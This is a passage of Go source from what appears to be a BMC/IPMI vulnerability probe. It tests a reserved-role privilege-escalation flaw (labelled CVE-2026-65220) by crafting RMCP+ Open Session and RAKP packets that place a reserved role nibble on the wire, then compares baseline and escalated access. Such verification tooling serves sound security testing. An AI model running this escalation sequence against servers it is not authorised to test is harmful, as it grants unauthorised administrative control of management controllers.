			// escalation is proven above USER and the ceiling is genuinely unresolved.
			return "operator-or-administrator (no read-only witness separates them on this firmware)", "", true
		}
	}
	return "administrator (witness inconclusive on this firmware)", "", true
}

// smcBaselineLogin opens an ordinary session as the named account, trying each
// candidate cipher suite. This is the control the escalation verdict depends on, and
// both the low-privilege baseline and the Operator control go through it.
//
// It must request the maximum privilege (4) and let the firmware clamp to the
// account's channel limit, not request USER the way OpenSession20User does.
// Requesting USER pins every control session at USER whatever the account is, which
// understates the baseline and mislabels commands a real Operator session is granted
// as Administrator witnesses.
func smcBaselineLogin(host string, port int, user, pass string, timeout time.Duration) (*Session20, error) {
	var lastErr error
	for _, suite := range smcHandshakeSuites() {
		s, err := OpenSession20(host, port, user, pass, suite, timeout)
		if err == nil {
			return s, nil
		}
		lastErr = err
	}
	return nil, lastErr
}

// SMCEscalationProven reports whether the measured result is a real escalation: the
// privileged read must be denied for privilege on the baseline login and allowed
// after the reserved-role sequence, otherwise the account may simply have held the
// privilege already. The baseline denial has to be 0xd4 specifically - accepting any
// non-zero code lets an unsupported or misaddressed command (0xcc, 0xc1, 0xc6) stand
// in for a privilege denial.
func SMCEscalationProven(e *SMCReservedRoleEscalation) bool {
	if e == nil || !e.BaselineMeasured {
		return false
	}
	if e.ProofMeasured {
		return smcWitnessDenied(e.ProofBaselineCC) && e.ProofEscalatedCC == 0x00
	}
	return smcWitnessDenied(e.BaselineUserAccessCC) && e.EscalatedUserAccessCC == 0x00
}

// smcSelectProofWitness picks the command the escalation verdict is built on: the
// first candidate that the baseline login was refused FOR PRIVILEGE and that the
// escalated session actually answered. It leaves ProofMeasured false when no
// candidate qualifies, which is a measurement failure and reported as one.
func smcSelectProofWitness(e *SMCReservedRoleEscalation) {
	if e == nil {
		return
	}
	for _, w := range e.Witnesses {
		if !w.BaselineMeasured || !smcWitnessDenied(w.BaselineCC) || !w.EscalatedMeasured {
			continue
		}
		e.ProofWitness = w.Name
		e.ProofBaselineCC = w.BaselineCC
		e.ProofEscalatedCC = w.EscalatedCC
		e.ProofMeasured = true
		return
	}
}

// --- shared wire builders -------------------------------------------------- //

// smcOpenSessionBody builds an RMCP+ Open Session Request payload.
func smcOpenSessionBody(consoleSID uint32, reqPriv byte, suite CipherAlgos) []byte {
	var b bytes.Buffer
	b.WriteByte(0x00)           // message tag
	b.WriteByte(reqPriv & 0x0f) // requested maximum privilege level
	b.Write([]byte{0x00, 0x00}) // reserved
	_ = binary.Write(&b, binary.LittleEndian, consoleSID)
	b.Write([]byte{0x00, 0x00, 0x00, 0x08, suite.Auth, 0, 0, 0})
	b.Write([]byte{0x01, 0x00, 0x00, 0x08, suite.Integrity, 0, 0, 0})
	b.Write([]byte{0x02, 0x00, 0x00, 0x08, suite.Conf, 0, 0, 0})
	return b.Bytes()
}

// smcRAKP1Body builds an RMCP+ RAKP message 1 payload. role is written verbatim
// so a reserved nibble reaches the wire unmodified -- that is the whole point of
// the CVE-2026-65220 probe.
func smcRAKP1Body(bmcSID uint32, consoleRand []byte, role byte, username string) []byte {
	var b bytes.Buffer
	b.WriteByte(0x00)        // message tag
	b.Write([]byte{0, 0, 0}) // reserved
	_ = binary.Write(&b, binary.LittleEndian, bmcSID)
	b.Write(consoleRand)
	b.WriteByte(role)
	b.Write([]byte{0, 0}) // reserved
	b.WriteByte(byte(len(username)))
	b.WriteString(username)
	return b.Bytes()
}

// smcRAKP3Body builds an RMCP+ RAKP message 3 payload carrying authCode.
func smcRAKP3Body(bmcSID uint32, authCode []byte) []byte {
	var b bytes.Buffer
	b.WriteByte(0x00)     // message tag
	b.WriteByte(0x00)     // status: no errors
	b.Write([]byte{0, 0}) // reserved
	_ = binary.Write(&b, binary.LittleEndian, bmcSID)
	b.Write(authCode)
	return b.Bytes()
}

// randomConsoleSID draws a console session ID, falling back to a fixed value if
// the system source fails (the value only needs to be echoed back, not secret).
func randomConsoleSID(fallback uint32) uint32 {
	var sid uint32
	_ = binary.Read(rand.Reader, binary.LittleEndian, &sid)
	if sid == 0 {
		return fallback
	}
	return sid
}
